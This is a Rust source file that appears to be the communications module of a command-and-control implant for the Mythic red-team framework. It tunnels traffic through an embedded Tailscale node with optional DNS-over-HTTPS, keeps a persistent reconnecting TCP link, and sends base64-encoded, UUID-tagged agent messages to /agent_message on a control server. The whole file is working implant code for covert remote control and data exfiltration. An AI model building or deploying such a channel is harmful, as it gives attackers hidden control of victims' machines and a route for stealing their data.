use std::ffi::CString;
use serde_json::Value;
use base64::{engine::general_purpose, Engine as _};
use crate::config;

extern "C" {
    fn ts_set_doh(doh_url: *const i8, control_url: *const i8);
    fn ts_init(auth_key: *const i8, control_url: *const i8, hostname: *const i8) -> i32;
    fn ts_http_post(
        url: *const i8,
        body: *const u8,
        body_len: i32,
        resp_buf: *mut u8,
        resp_buf_len: i32,
    ) -> i32;
    fn ts_tcp_connect(host: *const i8, port: *const i8) -> i32;
    fn ts_tcp_send(
        body: *const u8,
        body_len: i32,
        resp_buf: *mut u8,
        resp_buf_len: i32,
    ) -> i32;
    fn ts_close();
}

/// Initialize the embedded Tailscale networking stack.
/// Must be called once before any send_request calls.
/// If protocol is "tcp", also establishes the TCP connection.
pub fn init() -> Result<(), Box<dyn std::error::Error>> {
    let auth_key = CString::new(config::ts_auth_key)?;
    let control_url = CString::new(config::ts_control_url)?;
    let uuid = config::UUID.read().unwrap();
    let hostname = CString::new(format!(
        "agent-{}",
        if uuid.len() >= 8 { &uuid[..8] } else { &uuid }
    ))?;

    // Set up DNS-over-HTTPS before any network calls (selective: only Tailscale/Headscale domains)
    if !config::ts_doh_url.is_empty() {
        let doh_url = CString::new(config::ts_doh_url)?;
        let ctrl_url = CString::new(config::ts_control_url)?;
        unsafe { ts_set_doh(doh_url.as_ptr(), ctrl_url.as_ptr()) };
    }

    let result = unsafe { ts_init(auth_key.as_ptr(), control_url.as_ptr(), hostname.as_ptr()) };
    if result != 0 {
        return Err(format!("ts_init failed with code {}", result).into());
    }

    // If TCP protocol, establish the persistent connection
    if config::ts_protocol == "tcp" {
        tcp_connect()?;
    }

    Ok(())
}

fn tcp_connect() -> Result<(), Box<dyn std::error::Error>> {
    let host = CString::new(config::ts_server_hostname)?;
    let port = CString::new(config::ts_tcp_port)?;

    let result = unsafe { ts_tcp_connect(host.as_ptr(), port.as_ptr()) };
    if result != 0 {
        return Err(format!("ts_tcp_connect failed with code {}", result).into());
    }
    Ok(())
}

fn post_raw(body: &[u8]) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    if config::ts_protocol == "tcp" {
        return tcp_send_raw(body);
    }

    let url = CString::new(format!(
        "http://{}:{}/agent_message",
        config::ts_server_hostname,
        config::ts_server_port
    ))?;

    // 4 MB response buffer — Mythic responses can be large with SOCKS/file data
    let mut resp_buf = vec![0u8; 4 * 1024 * 1024];

    let resp_len = unsafe {
        ts_http_post(
            url.as_ptr(),
            body.as_ptr(),
            body.len() as i32,
            resp_buf.as_mut_ptr(),
            resp_buf.len() as i32,
        )
    };

    if resp_len < 0 {
        return Err(format!("ts_http_post failed: {}", resp_len).into());
    }

    resp_buf.truncate(resp_len as usize);
    Ok(resp_buf)
}

fn tcp_send_raw(body: &[u8]) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let mut resp_buf = vec![0u8; 4 * 1024 * 1024];

    let resp_len = unsafe {
        ts_tcp_send(
            body.as_ptr(),
            body.len() as i32,
            resp_buf.as_mut_ptr(),
            resp_buf.len() as i32,
        )
    };

    if resp_len == -3 {
        // Connection error — try reconnect once
        tcp_connect()?;
        let resp_len = unsafe {
            ts_tcp_send(
                body.as_ptr(),
                body.len() as i32,
                resp_buf.as_mut_ptr(),
                resp_buf.len() as i32,
            )
        };
        if resp_len < 0 {
            return Err(format!("ts_tcp_send failed after reconnect: {}", resp_len).into());
        }
        resp_buf.truncate(resp_len as usize);
        return Ok(resp_buf);
    }

    if resp_len < 0 {
        return Err(format!("ts_tcp_send failed: {}", resp_len).into());
    }

    resp_buf.truncate(resp_len as usize);
    Ok(resp_buf)
}

pub fn send_request(payload: &str) -> Result<String, Box<dyn std::error::Error>> {
    let uuid = config::UUID.read().unwrap();
    let full_msg = format!("{}{}", *uuid, payload);
    let encoded = general_purpose::STANDARD.encode(&full_msg);

    let resp_bytes = post_raw(encoded.as_bytes())?;
    let response = String::from_utf8(resp_bytes)?;
    Ok(response)
}

pub fn send_request_raw(payload: &str) -> Result<String, Box<dyn std::error::Error>> {
    let resp_bytes = post_raw(payload.as_bytes())?;
    let response = String::from_utf8(resp_bytes)?;
    Ok(response)
}

pub fn send_request_with_response(payload: &str) -> Result<Value, Box<dyn std::error::Error>> {
    let response_text = send_request(payload)?;
    let json: Value = serde_json::from_str(&response_text)?;
    Ok(json)
}

pub fn send_request_with_response_raw(payload: &str) -> Result<Value, Box<dyn std::error::Error>> {
    let response_text = send_request_raw(payload)?;
    let json: Value = serde_json::from_str(&response_text)?;
    Ok(json)
}
